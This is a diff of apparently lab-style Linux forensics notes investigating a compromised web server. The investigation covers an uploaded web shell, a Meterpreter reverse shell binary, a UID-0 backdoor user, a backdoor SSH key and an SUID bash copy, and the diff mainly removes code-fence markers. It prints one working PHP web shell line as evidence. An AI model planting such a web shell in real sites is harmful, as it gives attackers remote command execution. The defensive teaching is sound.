@@ -47,8 +47,7 @@ To start our investigation, we need to be able to explore the system's files eff
 To identify clues that the file upload feature was exploited, we should focus our search on the web directories and review the uploaded files on the server.  
 First, navigate to the web directory at `/var/www/html/` and run `ls -al` to list out the web files and directories:  
 
-    ```md
-    investigator@MACHINE_IP:~$ ls -al /var/www/html/
+      investigator@MACHINE_IP:~$ ls -al /var/www/html/
     total 32
     drwxr-xr-x 4 root     root      4096 Feb 12 23:05 .
     drwxr-xr-x 3 root     root      4096 Feb 12 16:25 ..
@@ -56,12 +55,12 @@ First, navigate to the web directory at `/var/www/html/` and run `ls -al` to lis
     -rw-r--r-- 1 root     root     10918 Feb 12 16:25 index.html
     -rwxr-xr-x 1 www-data www-data   905 Feb 12 16:33 upload.php
     drwxr-xr-x 2 www-data www-data  4096 Feb 13 00:31 uploads
-    ```
+
 
 From the directory structure, it appears that the `/uploads` directory will contain what we're hunting for.
 Let's list out the files in the uploads directory:
 
-    ```md           
+      
     investigator@MACHINE_IP:~$ ls -al /var/www/html/uploads
     total 224
     drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
@@ -75,7 +74,7 @@ Let's list out the files in the uploads directory:
     -rw-r--r-- 1 www-data www-data 1908 Feb 12 17:00 BcNmLoP.jpeg
     -rw-r--r-- 1 www-data www-data 1908 Feb 12 16:59 CoSaBmQ.jpeg
     ...
-    ````
+
         
 Upon examination of the `/uploads` directory, it is evident that many files with seemingly random names, including JPEG images, are present.  
 Additionally, note that these files are all owned by the www-data user.  
@@ -83,12 +82,12 @@ To focus on potential non-image files, we can use the grep command to filter out
 
 `:> investigator@MACHINE_IP:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"`  
 
-    ```md
+
     total 224
     drwxr-xr-x 2 www-data www-data 4096 Feb 13 00:31 .
     drwxr-xr-x 4 root     root     4096 Feb 12 23:05 ..
     -rw-r--r-- 1 www-data www-data   30 Feb 13 00:31 b2c8e1f5.phtml
-    ```
+
 
 The `-v` option in the grep command negates the pattern, displaying files that do not have the ".jpeg" extension.  
 This allows us to identify and prioritise files with different extensions, such as PHP, that may require further investigation.  
@@ -97,9 +96,9 @@ Viewing the contents of this interesting .phtml file suggests evidence of a mali
 
 `:> investigator@MACHINE_IP:~$ cat /var/www/html/uploads/b2c8e1f5.phtml`  
 
-    ```md
+
     <?php system($_GET['cmd']);?>
-    ```
+
 
 From the above analysis, it appears the attacker uploaded a .phtml document to execute PHP code on the server.  
 Due to the unsafe system() call in the PHP code, this file allows the execution of arbitrary commands on the system remotely.  
@@ -130,14 +129,14 @@ We can also leverage the find command to quickly identify files that match our c
 
 `:> investigator@MACHINE_IP:~$ find / -user www-data -type f 2>/dev/null | less`
 
-    ```md
+
     /var/www/html/assets/reverse.elf
     /var/www/html/uploads/MzCxVeR.jpeg
     /var/www/html/uploads/AzSxWqE.jpeg
     /var/www/html/uploads/QaWsEdR.jpeg
     /var/www/html/uploads/TyHjKlM.jpeg
     ...
-    ```
+
         
 The above command returns and lists all files the www-data user owns, starting from the root directory.  
 We are also directing the output of the command into the less command, which allows us to scroll and paginate the output, as there will likely be many entries.  
@@ -151,9 +150,9 @@ By listing out the file in more detail (`:> ls -l /var/www/html/assets/reverse.e
 
 `:> investigator@MACHINE_IP:~$ ls -l /var/www/html/assets/reverse.elf`
 
-    ```md
+
     -rwxr-xr-x 1 www-data www-data 250 Feb 13 00:26 /var/www/html/assets/reverse.elf
-    ```
+
 Before we investigate the reverse.elf file further, there are several other useful find commands that can be used to pull particular files during an investigation:  
 
 `:> find / -group GROUPNAME 2>/dev/null` :Retrieve a list of files and directories owned by a specific group.
@@ -177,7 +176,7 @@ For example, we can analyse the metadata of the suspicious reverse.elf file by r
 
 `:> investigator@MACHINE_IP:~$ exiftool /var/www/html/assets/reverse.elf`
 
-    ```md
+
     ExifTool Version Number         : 11.88
     File Name                       : reverse.elf
     Directory                       : /var/www/html/assets
@@ -193,7 +192,7 @@ For example, we can analyse the metadata of the suspicious reverse.elf file by r
     CPU Byte Order                  : Little endian
     Object File Type                : Executable file
     CPU Type                        : AMD x86-64
-    ```
+
         
 As seen in the above output, ExifTool tells us more details about this file, such as its type, size, permissions, architecture, and even modification and access timestamps.
 
@@ -212,11 +211,11 @@ We can run both md5sum and sha256sum on the file to output its hash:
 
 `:> investigator@MACHINE_IP:~$ md5sum /var/www/html/assets/reverse.elf` 
 
-    ```md 
+
     c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
     investigator@MACHINE_IP:~$ sha256sum /var/www/html/assets/reverse.elf 
     ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
-    ```
+
 Once we have obtained the hash values, we can submit them to a malware detection service like VirusTotal for further analysis.  
 Upon doing so, we will find evidence of various vendors flagging this file as a Meterpreter reverse shell payload.  
 This quick analysis suggests that the attacker placed and executed the reverse.elf file using their initial RCE to achieve an interactive reverse shell connection to the web server.
@@ -239,25 +238,25 @@ We can easily view the Modify Timestamp (mtime) of a file by running the followi
 
 `:> investigator@MACHINE_IP:~$ ls -l /var/www/html/assets/reverse.elf`
 
-    ```md
+
     -rwxr-xr-x 1 www-data www-data 250 Feb 13 00:26 /var/www/html/assets/reverse.elf
-    ```
+
 
 #### View the Change Timestamp (ctime)
 
 `:> investigator@MACHINE_IP:~$ ls -lc /var/www/html/assets/reverse.elf`
 
-    ```md
+
     -rwxr-xr-x 1 www-data www-data 250 Feb 13 00:34 /var/www/html/assets/reverse.elf
-    ```
+
 
 #### Viewing the Access Timestamp (atime)
 
 `:> investigator@MACHINE_IP:~$ ls -lu /var/www/html/assets/reverse.elf`  
 
-    ```md
+
     -rwxr-xr-x 1 www-data www-data 250 Feb 13 02:31 /var/www/html/assets/reverse.elf
-    ```
+
         
 As mentioned, a file's Access Timestamp (atime) can be easily and inadvertently updated as we perform investigative actions.  
 When we viewed the metadata using ExifTool or analysed its checksums with md5sum or sha256sum, we performed read actions on reverse.elf, thus altering its access time.  
@@ -270,7 +269,7 @@ Leverage the stat command to quickly see all three timestamps at once:
 
 `:> investigator@MACHINE_IP:~$ stat /var/www/html/assets/reverse.elf`
 
-```md
+
   File: /var/www/html/assets/reverse.elf
   Size: 250       	Blocks: 8          IO Block: 4096   regular file
 Device: ca01h/51713d	Inode: 526643      Links: 1
@@ -279,14 +278,12 @@ Access: 2024-02-13 02:31:29.256000000 +0000
 Modify: 2024-02-13 00:26:28.000000000 +0000
 Change: 2024-02-13 00:34:50.679215113 +0000
  Birth: -
-```
 
 #### Files, Permissions, and Timestamps Questions
 
 To practice your skills with the `find` command, locate all the files that the user **bob** created in the past 1 minute. Once found, review its contents. What is the flag you receive?  
 
 `:> cat $(find / -user bob -cmin -1 -type f 2>/dev/null)`
-
 
 Extract the metadata from the `reverse.elf` file. What is the file's MIME type?  
 
@@ -306,13 +303,12 @@ Specifically, when investigating user accounts, `/etc/passwd`is a colon-separate
 
 `:> investigator@MACHINE_IP:~$ cat /etc/passwd`  
 
-    ```md
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
     bin:x:2:2:bin:/bin:/usr/sbin/nologin
     sys:x:3:3:sys:/dev:/usr/sbin/nologin
     ...
-    ```
+
 
 Attackers can maintain access to a system by creating a backdoor user with root permissions.  
 We can leverage the cut and grep commands to identify this type of user account backdoor quickly.  
@@ -323,10 +319,8 @@ The presence of a user with UID 0, other than the legitimate root user account, 
 
 `:> investigator@MACHINE_IP:~$ cat /etc/passwd | cut -d: -f1,3 | grep ':0$'`
 
-    ```md
     root:0
     **********:0
-    ```
 
 In the above command, we first display the contents of the /etc/passwd file.  
 We then take the contents and perform a cut action to extract only the first (username) and third (user ID) fields from each line, delimited (-d by the : character.  
@@ -347,14 +341,12 @@ In Linux systems, certain groups grant specific privileges that attackers may ta
 
 `:> investigator@MACHINE_IP:~$ cat /etc/group`
 
-    ```md
     root:x:0:
     daemon:x:1:
     bin:x:2:
     sys:x:3:
     adm:x:4:syslog,ubuntu,investigator
-    ...
-    ```
+
         
 To determine which groups a specific user is a member of, we can:  
 
@@ -362,18 +354,16 @@ To determine which groups a specific user is a member of, we can:
 
 `:> investigator@MACHINE_IP:~$ groups investigator`  
 
-    ```md
     investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
-    ```
+
 Alternatively, to list all of the members of a specific group, we can run the following command:
 
 #### Viewing a Specific Groups' Users
 
 `:> investigator@MACHINE_IP:~$ getent group adm`  
 
-    ```md
     adm:x:4:syslog,ubuntu,investigator
-    ```
+
 If multiple users are in a group (as seen above), their usernames will be listed in a comma-separated format in the entry.  
 
 To list all users in the sudo group, we can provide either the name "sudo" or the group ID, typically 27.  
@@ -382,9 +372,9 @@ To list all users in the sudo group, we can provide either the name "sudo" or th
 
 `:> investigator@MACHINE_IP:~$ getent group 27`  
 
-    ```md
+
     sudo:x:27:ubuntu,investigator
-    ```
+
 
 ### User Logins and Activity
 
@@ -397,7 +387,7 @@ Similarly, `lastb` specifically tracks failed login attempts by reading the cont
 
 `:> investigator@MACHINE_IP:~$ last`  
 
-    ```md
+
     investig pts/1        10.10.152.206    Tue Feb 13 02:37   still logged in
     investig pts/0        10.10.101.34     Tue Feb 13 02:29   still logged in
     reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:28   still running
@@ -405,13 +395,13 @@ Similarly, `lastb` specifically tracks failed login attempts by reading the cont
     investig pts/0        10.10.101.34     Tue Feb 13 02:16 - 02:22  (00:05)
     reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:14   still running
     ...
-    ```
+
 
 The **`lastlog`** command focuses on a user's most recent login activity and reads from the `/var/log/lastlog` file.
 
 `:> investigator@MACHINE_IP:~$ lastlog`  
 
-    ```md
+
     Username         Port     From             Latest
     root                                       **Never logged in**
     daemon                                     **Never logged in**
@@ -419,7 +409,7 @@ The **`lastlog`** command focuses on a user's most recent login activity and rea
     sys                                        **Never logged in**
     sync                                       **Never logged in**
     ...
-    ```
+
         
 **Failed Login Attempts**  
 
@@ -433,9 +423,9 @@ The output of this command can provide details such as the name of the user logg
 
 `:> investigator@MACHINE_IP:~$ who`
 
-    ```md
+
     investigator pts/0        2024-02-13 02:29 (10.10.101.34)
-    ```
+
         
 
 ### Sudo
@@ -495,7 +485,6 @@ By default, we cannot list out these hidden files using ls.
 To view them, we need to provide the -a argument, which will include all entries starting with a dot.  
 
 #### Listing Jane's Hidden Files and Directories
-
            
 `:> investigator@10.82.165.240:~$ ls -a /home/jane`  
 
@@ -533,8 +522,6 @@ If a malicious user gains unauthorised access to a system and wants to persisten
     ssh-rsa ******************** jane@ip-10-10-25-169
     ssh-rsa ******************** backdoor
 
-        
-
 Notice that there are two entries.  
 The first belongs to Jane, as signified by the ending comment  
 However, the second entry appears to be related to an entirely different keypair with the comment "backdoor".  
@@ -554,7 +541,6 @@ By running `stat` on the file, we can see that it was last modified around a sim
     Modify: ****-**-** **:**:**.********* +****
     Change: 2024-02-13 00:34:16.005897449 +0000
     Birth: -
-
 
 If we look back to the output of the ls -al command, we can identify the permission misconfiguration that made this possible:  
 
@@ -592,7 +578,6 @@ We can use the find command on UNIX-based systems to discover all executable fil
     /snap/core/16574/etc/init.d/ubuntu-fan
     /snap/core/16574/etc/init.d/udev
     ...
-
 
 The following command recursively traverses the file system starting from the root directory and lists any executable file it finds.  
 Note that this provides a huge amount of output.  
@@ -682,7 +667,6 @@ After making an SUID copy of /bin/bash, the attacker elevated to root by running
 We can further verify the bash binary by performing an integrity check on the original:  
 
 #### Integrity Checking the Suspicious SUID Binary
-
            
 `:> investigator@10.82.165.240:~$ md5sum /var/tmp/bash`  
 
